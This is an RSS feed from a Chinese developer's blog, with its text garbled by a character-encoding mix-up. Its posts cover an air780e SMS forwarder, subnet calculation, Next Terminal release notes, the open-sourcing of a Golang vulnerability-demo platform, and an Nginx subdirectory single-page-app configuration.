<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>æœä¸–ç¿”</title><link>https://www.typesafe.cn/</link><description>Recent content on æœä¸–ç¿”</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Sat, 13 Dec 2025 21:33:35 +0800</lastBuildDate><atom:link href="https://www.typesafe.cn/index.xml" rel="self" type="application/rss+xml"/><item><title>30 å…ƒæˆæœ¬æå®š GiffGaff çŸ­ä¿¡è½¬å‘ä¸è‡ªåŠ¨ä¿æ´»</title><link>https://www.typesafe.cn/posts/air780e-giffgaff/</link><pubDate>Sat, 13 Dec 2025 21:33:35 +0800</pubDate><guid>https://www.typesafe.cn/posts/air780e-giffgaff/</guid><description>&lt;p>å…ˆè¯´æ˜ä¸€ç‚¹ï¼š&lt;strong>è¿™ä¸ªé¡¹ç›®å¹¶ä¸æ˜¯é‡å¤é€ è½®å­ã€‚&lt;/strong>
å¦‚æœä½ æœç´¢è¿‡ã€Œ&lt;strong>air780e çŸ­ä¿¡è½¬å‘&lt;/strong>ã€ï¼Œå¤§æ¦‚èƒ½çœ‹åˆ°ç›®å‰ä¸»è¦æœ‰ä¸¤ç§æ–¹æ¡ˆï¼š&lt;/p>
&lt;p>&lt;strong>æ–¹æ¡ˆä¸€ï¼šä½¿ç”¨ air780e SIMå¡è‡ªå¸¦æµé‡è¿›è¡Œè½¬å‘&lt;/strong>
å®ç°ç®€å•ï¼Œä½†é—®é¢˜ä¹Ÿå¾ˆæ˜æ˜¾â€”â€”åƒ GiffGaff è¿™ç§å¡æµé‡ä»·æ ¼éå¸¸ç¦»è°±ï¼Œé•¿æœŸä½¿ç”¨æˆæœ¬å¤ªé«˜ï¼Œç›´æ¥ Passã€‚&lt;/p>
&lt;p>&lt;strong>æ–¹æ¡ˆäºŒï¼šair780e + ESP32ï¼Œé€šè¿‡ WiFi è½¬å‘&lt;/strong>
è¿™ç§æ–¹å¼åœ¨æŠ€æœ¯ä¸Šæ˜¯å¯è¡Œçš„ï¼Œä½†éœ€è¦è‡ªå·±ç„Šæ¥ ESP32ã€‚
å¥ˆä½•æˆ‘å±äºé‚£ç§&lt;strong>ä¸€æ‹¿ç”µçƒ™é“æ‰‹å°±å¼€å§‹æ‰‹æŠ–&lt;/strong>çš„äººï¼Œç„Šç²¾å¯†å…ƒä»¶åŸºæœ¬ç­‰äºåŠé€€ ğŸ˜…ã€‚&lt;/p>
&lt;hr>
&lt;p>åŸºäºä»¥ä¸ŠåŸå› ï¼Œæˆ‘æœ€ç»ˆé€‰æ‹©äº†ä¸€æ¡&lt;strong>å®Œå…¨ä¸éœ€è¦ç„Šæ¥&lt;/strong>çš„è·¯çº¿ï¼š&lt;/p>
&lt;h2 id="ä¸²å£æ§åˆ¶-air780e--golang-åç«¯">ä¸²å£æ§åˆ¶ air780e + Golang åç«¯&lt;/h2>
&lt;p>é€šè¿‡ä¸²å£ç›´æ¥æ§åˆ¶ air780eï¼ŒæŠŠçŸ­ä¿¡çš„æ”¶å‘èƒ½åŠ›ä¿ç•™å‡ºæ¥ï¼Œåç«¯ä½¿ç”¨ &lt;strong>Golang&lt;/strong> æ¥å®ç°ç»Ÿä¸€çš„æœåŠ¡å±‚ã€‚&lt;/p>
&lt;p>ç›®å‰è¿™ä¸ªæ–¹æ¡ˆçš„ç‰¹ç‚¹æ˜¯ï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>å³æ’å³ç”¨ï¼Œæ— éœ€ç„Šæ¥&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>ç¡¬ä»¶æˆæœ¬æä½ï¼Œç†è®ºä¸Š air780e xxç³»åˆ—çš„ç¡¬ä»¶éƒ½æ”¯æŒ&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>ç§»åŠ¨ / è”é€šç‰ˆæœ¬ï¼šçº¦ &lt;strong>30 å…ƒ&lt;/strong>&lt;/li>
&lt;li>å…¨ç½‘é€šç‰ˆæœ¬ï¼šçº¦ &lt;strong>50 å…ƒ&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>éƒ¨ç½²ç®€å•&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>åªéœ€è¦ä¸€å°èƒ½æ’ USB çš„å°å‹è®¾å¤‡&lt;/li>
&lt;li>æ¯”å¦‚ N1 ç›’å­ã€è½¯è·¯ç”±ã€è¿·ä½ ä¸»æœºç­‰&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>åŠŸèƒ½å·²ç»å¯ç”¨&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>çŸ­ä¿¡æ¥æ”¶&lt;/li>
&lt;li>çŸ­ä¿¡å‘é€&lt;/li>
&lt;li>æ¶ˆæ¯æ¨é€&lt;/li>
&lt;li>è‡ªåŠ¨å‘é€ / è‡ªåŠ¨å›å¤&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>æ’ä¸Š air780eï¼Œè¿è¡Œæˆ‘å†™çš„ç¨‹åºï¼Œå®Œäº‹ã€‚&lt;/p>
&lt;p>é¡¹ç›®åœ°å€ï¼šhttps://github.com/dushixiang/uart_sms_forwarder&lt;/p>
&lt;p>æˆªå›¾å¦‚ä¸‹ï¼š&lt;/p>
&lt;p>&lt;img src="../../static/images/sms1.png" alt="sms1.png">&lt;/p>
&lt;p>&lt;img src="../../static/images/sms2.png" alt="sms2.png">&lt;/p>
&lt;h2 id="å…¶ä»–è¡¥å……è¯´æ˜">å…¶ä»–è¡¥å……è¯´æ˜&lt;/h2>
&lt;p>åˆå®™ air780 ç³»åˆ—å‹å·æå¤šï¼Œåˆšå¼€å§‹æçš„æ—¶å€™æˆ‘ä¹Ÿæ˜¯ä¸€è„¸æ‡µé€¼ï¼Œåé¢çœ‹åˆ°ä¸€å¼ å¯¹æ¯”å›¾æ‰äº†è§£åˆ°å®ƒä»¬ä¹‹é—´çš„åŒºåˆ«ã€‚&lt;/p>
&lt;p>&lt;a href="https://docs.openluat.com/air780epm/">https://docs.openluat.com/air780epm/&lt;/a>&lt;/p>
&lt;p>&lt;img src="../../static/images/air780e.png" alt="air780e.png">&lt;/p></description></item><item><title>ä¸ç’æ‚¨è¯´ï¼Œæˆ‘ä»Šå¤©æ‰å­¦ä¼šå­ç½‘åˆ’åˆ†</title><link>https://www.typesafe.cn/posts/subnet/</link><pubDate>Fri, 07 Nov 2025 21:26:09 +0800</pubDate><guid>https://www.typesafe.cn/posts/subnet/</guid><description>&lt;p>ä¼—æ‰€å‘¨çŸ¥ï¼Œæˆ‘æ˜¯ä¸€ä¸ªç¨‹åºå‘˜ï¼Œå†™è¿‡ä¸å°‘å¼€æºé¡¹ç›®ã€‚&lt;/p>
&lt;p>æ‰€ä»¥æˆ‘ä½œä¸ºä¸€ä¸ªç¨‹åºå‘˜äº†è§£ä¸€äº›è®¡ç®—æœºç½‘ç»œç›¸å…³çš„çŸ¥è¯†ä¸è¿‡åˆ†å§ï¼Œåœ¨å‡ å¹´å‰æˆ‘ä¹Ÿå†™è¿‡ä¸å°‘ Linux ç½‘ç»œå’ŒOVSçš„æ•™ç¨‹ã€‚&lt;/p>
&lt;p>ä½†æ˜¯ï¼Œæˆ‘ä»Šå¤©å‘ç°è‡ªå·±ä¸ä¼šå­ç½‘åˆ’åˆ†ã€‚&lt;/p>
&lt;p>äº‹æƒ…è¿˜è¦ä»æ˜å¤©å¼€å§‹è¯´èµ·ï¼Œå› ä¸ºæ˜å¤©å°±è¦è½¯è€ƒäº†ï¼Œè€Œæˆ‘ï¼Œä¸ºäº†æŠµæ‰£ä¸ªç¨ï¼Œé€‰æ‹©äº†åˆçº§çš„ç½‘ç»œç®¡ç†å‘˜è¿™ä¸ªç§‘ç›®è¿›è¡ŒæŠ¥è€ƒã€‚&lt;/p>
&lt;p>ä»Šå¤©åœ¨åˆ·é¢˜çš„æ—¶å€™å‘ç°æœ‰å¾ˆå¤šåˆ’åˆ†å­ç½‘ç±»å‹çš„é¢˜ç›®ï¼ˆåˆ«é—®æˆ‘ä¸ºä»€ä¹ˆä»Šå¤©æ‰å¼€å§‹åˆ·ï¼Œé—®å°±æ˜¯åœ¨åŠªåŠ›å·¥ä½œï¼‰ï¼Œä½†æ˜¯æˆ‘ä¸ä¼šï¼Œæˆ‘ä¹Ÿä¸å¯èƒ½å»ç™¾åº¦ä¸€ä¸ª CIDR è®¡ç®—å™¨å•Šï¼Œè¿™æ˜¯è€ƒè¯•ã€‚&lt;/p>
&lt;p>ä½ å…ˆåˆ«æ€¥ç€ç¬‘è¯æˆ‘ï¼Œä½ ä»¥ä¸ºä½ ç»™å®¶é‡Œè·¯ç”±å™¨é…ç½®ä¸€ä¸ª &amp;ldquo;192.168.1.1/24&amp;rdquo; å°±ç®—ä¼šäº†å—ï¼Ÿ&lt;/p>
&lt;p>å¤§é”™ç‰¹é”™ï¼âŒ&lt;/p>
&lt;p>ä¸‹é¢è¯·å¬ç¬¬ä¸€é¢˜ï¼Œå·²çŸ¥è·¯ç”±å™¨çš„CIDRæ˜¯ &amp;ldquo;192.168.1.1/24&amp;rdquo;ï¼Œè¯·é—®å®ƒçš„å­ç½‘æ©ç æ˜¯å¤šå°‘ï¼Ÿç¬¬ä¸€ä¸ªIPåœ°å€æ˜¯å¤šå°‘ï¼Ÿæœ€åä¸€ä¸ªIPåœ°å€æ˜¯å¤šå°‘ï¼Ÿæœ‰å¤šå°‘ä¸ªå¯ç”¨çš„IPåœ°å€ï¼Ÿ&lt;/p>
&lt;p>æ˜¯ä¸æ˜¯å¼ å£å°±æ¥ï¼Œå­ç½‘æ©ç æ˜¯ &amp;ldquo;255.255.255.0&amp;rdquo;ï¼Œç¬¬ä¸€ä¸ªIPåœ°å€æ˜¯ &amp;ldquo;192.168.1.1&amp;rdquo;ï¼Œæœ€åä¸€ä¸ªIPåœ°å€æ˜¯ &amp;ldquo;192.168.1.254&amp;rdquo;ï¼Œæœ‰ 254 ä¸ªå¯ç”¨çš„IPåœ°å€ã€‚&lt;/p>
&lt;p>å¾ˆå¥½ï¼Œå¾ˆæœ‰ç²¾ç¥ã€‚&lt;/p>
&lt;p>è¯·å¬ç¬¬äºŒé¢˜ï¼Œå‡è®¾è·¯ç”±å™¨çš„CIDRæ˜¯ &amp;ldquo;192.168.31.19/19&amp;rdquo;ï¼Œè¯·é—®å®ƒçš„å­ç½‘æ©ç æ˜¯å¤šå°‘ï¼Ÿç¬¬ä¸€ä¸ªIPåœ°å€æ˜¯å¤šå°‘ï¼Ÿæœ€åä¸€ä¸ªIPåœ°å€æ˜¯å¤šå°‘ï¼Ÿæœ‰å¤šå°‘ä¸ªå¯ç”¨çš„IPåœ°å€ï¼Ÿ&lt;/p>
&lt;p>æ˜¯ä¸æ˜¯æœ‰äº›æ‡µé€¼ï¼Ÿ&lt;/p>
&lt;hr>
&lt;p>æˆ‘ä»Šå¤©å°±æ¥æŠŠæˆ‘åˆšå­¦ä¼šçš„è®¡ç®—æ–¹å¼æ•™ç»™ä½ ã€‚&lt;/p>
&lt;h3 id="æ­¥éª¤1è®¡ç®—å­ç½‘æ©ç ">æ­¥éª¤1ï¼Œè®¡ç®—å­ç½‘æ©ç ï¼š&lt;/h3>
&lt;p>é¦–å…ˆï¼Œä½ è¦ç†è§£CIDRä¸­çš„ &amp;ldquo;/19&amp;rdquo; çš„å«ä¹‰ã€‚&lt;/p>
&lt;p>&amp;ldquo;/19&amp;rdquo; ä»£è¡¨ç½‘ç»œå‰ç¼€çš„é•¿åº¦æ˜¯ 19ä½ï¼Œä¸»æœºä½ = &lt;code>32 - 19 = 13&lt;/code> ä½ã€‚&lt;/p>
&lt;p>å­ç½‘æ©ç äºŒè¿›åˆ¶ï¼ˆ32 ä½ï¼‰æŒ‰ 8 ä½å—åˆ†ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-txt" data-lang="txt">&lt;span style="display:flex;">&lt;span>11111111.11111111.11100000.00000000
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç®€å•ç†è§£å°±æ˜¯ 19 ä¸ª 1ï¼Œ13 ä¸ª 0ã€‚&lt;/p>
&lt;p>æŠŠæ¯å…«ä½æ¢æˆåè¿›åˆ¶ï¼š&lt;/p>
&lt;ul>
&lt;li>11111111 = 255&lt;/li>
&lt;li>11111111 = 255&lt;/li>
&lt;li>11100000 = 128+64+32 = 224&lt;/li>
&lt;li>00000000 = 0&lt;/li>
&lt;/ul>
&lt;p>å­ç½‘æ©ç ï¼ˆæ¢æˆåè¿›åˆ¶ï¼‰ = &lt;code>255.255.224.0&lt;/code>&lt;/p>
&lt;h3 id="æ­¥éª¤2è®¡ç®—ç½‘ç»œåœ°å€">æ­¥éª¤2ï¼Œè®¡ç®—ç½‘ç»œåœ°å€&lt;/h3>
&lt;p>æŠŠ 192.168.31.19 è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ˜¯ &lt;code>11000000.10101000.00011111.00010011&lt;/code>&lt;/p></description></item><item><title>Next Terminal v2.6.0 æ›´æ–°æ—¥å¿—</title><link>https://www.typesafe.cn/posts/next-terminal-v2_6_0/</link><pubDate>Sat, 27 Sep 2025 12:00:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/next-terminal-v2_6_0/</guid><description>&lt;h2 id="ç‰ˆæœ¬æ¦‚è§ˆ">ç‰ˆæœ¬æ¦‚è§ˆ&lt;/h2>
&lt;p>&lt;strong>å‘å¸ƒæ—¥æœŸ&lt;/strong>: 2025å¹´9æœˆ27æ—¥&lt;br>
&lt;strong>ç‰ˆæœ¬å·&lt;/strong>: v2.6.0&lt;br>
&lt;strong>æ›´æ–°ç±»å‹&lt;/strong>: åŠŸèƒ½å¢å¼ºç‰ˆæœ¬&lt;/p>
&lt;hr>
&lt;h2 id="æ–°å¢åŠŸèƒ½">æ–°å¢åŠŸèƒ½&lt;/h2>
&lt;h3 id="èº«ä»½è®¤è¯å¢å¼º">èº«ä»½è®¤è¯å¢å¼º&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>ä¼ä¸šå¾®ä¿¡è®¤è¯&lt;/strong>: æ–°å¢ä¼ä¸šå¾®ä¿¡å•ç‚¹ç™»å½•ï¼Œä¸ºä¼ä¸šç”¨æˆ·æä¾›æ— ç¼ã€å®‰å…¨çš„ç™»å½•ä½“éªŒ&lt;/li>
&lt;li>&lt;strong>OIDCè®¤è¯&lt;/strong>: é›†æˆ OpenID Connect (OIDC) åè®®ï¼Œæ‰©å±•äº†å¯¹ç¬¬ä¸‰æ–¹èº«ä»½æä¾›å•†çš„æ”¯æŒ&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://www.typesafe.cn/images/next-terminal/v2_6_0/wecom-auth-config.png" alt="ä¼ä¸šå¾®ä¿¡è®¤è¯é…ç½®">
&lt;img src="https://www.typesafe.cn/images/next-terminal/v2_6_0/oidc-auth-config.png" alt="OIDCè®¤è¯è®¾ç½®">&lt;/p>
&lt;h3 id="èµ„äº§ç®¡ç†ä¼˜åŒ–">èµ„äº§ç®¡ç†ä¼˜åŒ–&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>Webèµ„äº§åˆ†ç»„&lt;/strong>: æ–°å¢Webèµ„äº§åˆ†ç»„åŠŸèƒ½ï¼Œä¾¿äºæ‰¹é‡ç®¡ç†å’Œç»„ç»‡&lt;/li>
&lt;li>&lt;strong>WOLç½‘ç»œå”¤é†’&lt;/strong>: SSHã€RDPã€VNC åŠ Telnet èµ„äº§ç°å·²æ”¯æŒ Wake-on-LAN (WOL) åŠŸèƒ½ï¼Œå¯è¿œç¨‹å”¤é†’ç¦»çº¿è®¾å¤‡&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://www.typesafe.cn/images/next-terminal/v2_6_0/web-asset-groups.png" alt="Webèµ„äº§åˆ†ç»„åŠŸèƒ½">
&lt;img src="https://www.typesafe.cn/images/next-terminal/v2_6_0/wol-config.png" alt="WOLç½‘ç»œå”¤é†’é…ç½®">&lt;/p>
&lt;h3 id="ai-æ™ºèƒ½åŠ©æ‰‹">AI æ™ºèƒ½åŠ©æ‰‹&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>AI ShellåŠ©æ‰‹&lt;/strong>: é›†æˆ AI åŠ©æ‰‹ï¼Œå¯åœ¨ Shell ç¯å¢ƒä¸­æä¾›æ™ºèƒ½å‘½ä»¤å»ºè®®ä¸æ“ä½œæŒ‡å¯¼&lt;/li>
&lt;li>&lt;strong>ç»ˆç«¯å†…æœç´¢&lt;/strong>: æ–°å¢ç»ˆç«¯å†…å®¹æœç´¢ï¼Œæ”¯æŒåœ¨ä¼šè¯ä¸­å¿«é€Ÿå®šä½å†å²å‘½ä»¤åŠè¾“å‡º&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://www.typesafe.cn/images/next-terminal/v2_6_0/ai-shell-assistant.png" alt="AI ShellåŠ©æ‰‹ç•Œé¢">
&lt;img src="https://www.typesafe.cn/images/next-terminal/v2_6_0/ai-assistant-interaction-demo.png" alt="AIåŠ©æ‰‹äº¤äº’ç¤ºä¾‹">
&lt;img src="https://www.typesafe.cn/images/next-terminal/v2_6_0/terminal-search.png" alt="ç»ˆç«¯å†…æœç´¢åŠŸèƒ½">&lt;/p>
&lt;h3 id="ç»„ç»‡æ¶æ„è°ƒæ•´">ç»„ç»‡æ¶æ„è°ƒæ•´&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>éƒ¨é—¨ç®¡ç†&lt;/strong>: ç”¨æˆ·ç»„åŠŸèƒ½å·²å‡çº§ä¸ºéƒ¨é—¨ç®¡ç†ï¼Œæ”¯æŒæ›´ç²¾ç»†åŒ–çš„å¤šå±‚çº§ç»„ç»‡æ¶æ„&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://www.typesafe.cn/images/next-terminal/v2_6_0/department-management.png" alt="éƒ¨é—¨ç®¡ç†ç•Œé¢">&lt;/p>
&lt;hr>
&lt;h2 id="åŠŸèƒ½ä¼˜åŒ–">åŠŸèƒ½ä¼˜åŒ–&lt;/h2>
&lt;h3 id="æƒé™ç®¡ç†æ”¹è¿›">æƒé™ç®¡ç†æ”¹è¿›&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>èµ„äº§æˆæƒä¼˜åŒ–&lt;/strong>: é‡æ–°è®¾è®¡èµ„äº§æˆæƒæ–¹å¼ä¸å±•ç¤ºç•Œé¢ï¼Œæ“ä½œæ›´ç›´è§‚&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>ä¼˜åŒ–å‰&lt;/strong>:
&lt;img src="https://www.typesafe.cn/images/next-terminal/v2_6_0/asset-authorization-before.png" alt="æ—§ç‰ˆæˆæƒç•Œé¢">&lt;/p>
&lt;p>&lt;strong>ä¼˜åŒ–å&lt;/strong>:
&lt;img src="https://www.typesafe.cn/images/next-terminal/v2_6_0/asset-authorization-after.png" alt="æ–°ç‰ˆæˆæƒç•Œé¢">&lt;/p>
&lt;h3 id="ç½‘ç»œä¸ç³»ç»Ÿä¼˜åŒ–">ç½‘ç»œä¸ç³»ç»Ÿä¼˜åŒ–&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>IPè·å–ä¼˜åŒ–&lt;/strong>: æ”¹è¿›äº†ç³»ç»Ÿè·å– IP çš„æ–¹å¼ï¼Œç°å¯è‡ªåŠ¨ä¿¡ä»» &lt;code>0.0.0.0&lt;/code> åœ°å€ï¼Œç®€åŒ–äº†ç‰¹æ®Šç½‘ç»œç¯å¢ƒä¸‹çš„é…ç½®&lt;/li>
&lt;li>&lt;strong>æ“ä½œç³»ç»Ÿè¯†åˆ«&lt;/strong>: ä¼˜åŒ–äº†æ“ä½œç³»ç»Ÿè‡ªåŠ¨è¯†åˆ«åŠŸèƒ½ï¼Œæ˜¾è‘—æå‡äº†è¯†åˆ«å‡†ç¡®ç‡&lt;/li>
&lt;li>&lt;strong>åœ°ç†ä½ç½®æœåŠ¡&lt;/strong>: IP åœ°ç†ä½ç½®æœåŠ¡å·²åˆ‡æ¢è‡³ GeoIPï¼Œæä¾›æ›´ç²¾å‡†çš„å®šä½ï¼ˆä¸“ä¸šç‰ˆåŠŸèƒ½ï¼‰&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://www.typesafe.cn/images/next-terminal/v2_6_0/os-auto-detection.png" alt="æ“ä½œç³»ç»Ÿè‡ªåŠ¨è¯†åˆ«">
&lt;img src="https://www.typesafe.cn/images/next-terminal/v2_6_0/geoip-service.png" alt="GEOIPåœ°ç†ä½ç½®æœåŠ¡">&lt;/p>
&lt;h3 id="é…ç½®ä¸å®‰å…¨">é…ç½®ä¸å®‰å…¨&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>åå‘ä»£ç†é…ç½®&lt;/strong>: åå‘ä»£ç†è®¾ç½®å·²è¿ç§»è‡³é…ç½®æ–‡ä»¶ï¼Œç®€åŒ–äº†æ‰¹é‡éƒ¨ç½²ä¸è‡ªåŠ¨åŒ–è¿ç»´&lt;/li>
&lt;li>&lt;strong>å®‰å…¨è®¾ç½®å…è´¹åŒ–&lt;/strong>: å®‰å…¨è®¾ç½®å·²å¯¹æ‰€æœ‰ç”¨æˆ·å…è´¹å¼€æ”¾&lt;/li>
&lt;li>&lt;strong>TLSå…¼å®¹æ€§&lt;/strong>: æ”¾å®½äº†åå‘ä»£ç†çš„ TLS éªŒè¯ï¼Œä»¥å…¼å®¹ä½¿ç”¨æ—§ç‰ˆ TLS è¯ä¹¦çš„ç³»ç»Ÿ&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://www.typesafe.cn/images/next-terminal/v2_6_0/reverse-proxy-config.png" alt="åå‘ä»£ç†é…ç½®">
&lt;img src="https://www.typesafe.cn/images/next-terminal/v2_6_0/security-settings.png" alt="å®‰å…¨è®¾ç½®ç•Œé¢">&lt;/p></description></item><item><title>æˆ‘ä¸ºä»€ä¹ˆå¼€æºäº†ä¸‰å¹´å‰å†™çš„æ¼æ´éªŒè¯å¹³å°ï¼Ÿ</title><link>https://www.typesafe.cn/posts/cyberpoc/</link><pubDate>Sat, 06 Sep 2025 00:00:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/cyberpoc/</guid><description>&lt;p>å¤§æ¦‚ä¸‰å¹´å‰ï¼Œæˆ‘çœ‹åˆ°æœ‰äººç”¨ä»£ç ç‰‡æ®µåˆ†äº«æ¼æ´åŸç†ï¼Œè§‰å¾—å¾ˆæœ‰æ„æ€ï¼Œæˆ‘ä¹Ÿæ¨¡ä»¿è®¾è®¡äº†ä¸€äº› Golang çš„æ¼æ´ã€‚&lt;/p>
&lt;p>å¯æƒœæƒ³è¦éªŒè¯ï¼Œå¾—è‡ªå·±æ­å»ºç¯å¢ƒï¼Œé—¨æ§›ä¸ä½ã€‚&lt;/p>
&lt;p>äºæ˜¯æˆ‘åˆåšäº†ä¸€ä¸ªå¹³å°ï¼ŒæŠŠæ¼æ´ç¯å¢ƒå°è£…æˆ Docker é•œåƒã€‚ç”¨æˆ·åªéœ€ç‚¹ä¸€ä¸‹ï¼Œå°±èƒ½åœ¨å‡ ç§’å†…å¯åŠ¨ç¯å¢ƒï¼Œç›´æ¥éªŒè¯ã€‚&lt;/p>
&lt;p>ç¬¬ä¸€ä¸ªç‰ˆæœ¬å¾ˆå¿«ä¸Šçº¿ï¼Œæˆ‘é™†ç»­å°è£…äº†åå‡ ä¸ªæ¼æ´ç¯å¢ƒã€‚ä½†åæ¥è¶Šåšè¶Šå¤æ‚ï¼ŒåŠ äº†è™šæ‹Ÿæœºç®¡ç†å’Œåˆ†å¸ƒå¼ç½‘ç»œï¼Œç»“æœéƒ¨ç½²ç»´æŠ¤éº»çƒ¦åˆ°è¿æˆ‘è‡ªå·±éƒ½ä¸æƒ³æäº†ï¼Œå†åŠ ä¸Šæˆ‘äº†è§£åˆ°çš„ Golang æ¼æ´å°±é‚£ä¹ˆå¤šï¼Œå¹³å°æ²¡äººç”¨ï¼Œé¡¹ç›®ä¹Ÿå°±æç½®äº†ã€‚&lt;/p>
&lt;p>æœ€è¿‘æˆ‘åšäº†ä¸€ä¸ªè¿èƒŒç¥–å®—çš„å†³å®šï¼šå»æ‰å¤šä½™çš„ä¸œè¥¿ï¼Œåªä¿ç•™å®¹å™¨åŒ–çš„æ¼æ´ç¯å¢ƒï¼Œå¹¶æŠŠå¹³å°å’Œæ¼æ´ç¯å¢ƒå…¨éƒ¨å¼€æºã€‚&lt;/p>
&lt;p>é¡¹ç›®å’Œæ¼æ´ç¯å¢ƒéƒ½æ˜¯ç”¨ Golang å†™çš„ï¼Œé…ç½®è¦æ±‚å¾ˆä½ï¼Œå¼€ç®±å³ç”¨ã€‚
å¦‚æœä½ è§‰å¾—æœ‰ç”¨ï¼Œæ¬¢è¿ç‚¹ä¸ª starï¼š&lt;/p>
&lt;ul>
&lt;li>æ¼æ´ç¯å¢ƒï¼šhttps://github.com/dushixiang/vulnerable-code&lt;/li>
&lt;li>éªŒè¯å¹³å°ï¼šhttps://github.com/dushixiang/cyberpoc&lt;/li>
&lt;li>æµ‹è¯•åœ°å€ï¼šhttps://cyberpoc.typesafe.cn&lt;/li>
&lt;/ul>
&lt;p>é™„ä¸Šå‡ å¼ æˆªå›¾&lt;/p>
&lt;p>&lt;img src="https://www.typesafe.cn/images/cyberpoc_vuln.png" alt="">
&lt;img src="https://www.typesafe.cn/images/cyberpoc_0.png" alt="">
&lt;img src="https://www.typesafe.cn/images/cyberpoc_1.png" alt="">&lt;/p></description></item><item><title>Nginx äºŒçº§ç›®å½•å•é¡µåº”ç”¨çš„æ­£ç¡®é…ç½®æ–¹å¼</title><link>https://www.typesafe.cn/posts/nginx-subdirectory-spa-config/</link><pubDate>Fri, 05 Sep 2025 17:03:53 +0800</pubDate><guid>https://www.typesafe.cn/posts/nginx-subdirectory-spa-config/</guid><description>&lt;p>ä»Šå¤©é…ç½®äº†ä¸€ä¸ª Nginx çš„äºŒçº§ç›®å½•å•é¡µåº”ç”¨ï¼Œæäº†å¥½ä¹…æ‰é…ç½®å¥½ï¼Œè®°å½•ä¸€ä¸‹ã€‚&lt;/p>
&lt;p>æ­£ç¡®çš„é…ç½®æ–¹å¼ç¤ºä¾‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># å­åº”ç”¨&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>location /subapp/ &lt;span style="color:#ff79c6">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">alias&lt;/span> /opt/app/subapp/; 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> index index.html;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> try_files &lt;span style="color:#8be9fd;font-style:italic">$uri&lt;/span> /subapp/index.html;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># æ ¹åº”ç”¨&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>location / &lt;span style="color:#ff79c6">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> root /opt/app/web;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> index index.html index.htm;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> try_files &lt;span style="color:#8be9fd;font-style:italic">$uri&lt;/span> /index.html;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="å‘1-ä½¿ç”¨-alias-è€Œä¸æ˜¯-root">å‘1: ä½¿ç”¨ &lt;code>alias&lt;/code> è€Œä¸æ˜¯ &lt;code>root&lt;/code>&lt;/h3>
&lt;p>Nginx çš„ root ä¼šæŠŠ location çš„åŒ¹é…éƒ¨åˆ†ä¹Ÿæ‹¼æ¥è¿›å»ï¼Œæ‰€ä»¥è®¿é—®ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>https://yourdomain/subapp/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å®é™…ä¼šå»æ‰¾ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>/opt/app/subapp/subapp/index.html
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™å°±å¤šäº†ä¸€å±‚ &lt;code>subapp&lt;/code> ç›®å½•ï¼Œé€šå¸¸ä¼š 404ã€‚&lt;/p>
&lt;p>æ³¨æ„ alias æœ€åå¿…é¡»åŠ  &lt;code>/&lt;/code> ã€‚&lt;/p>
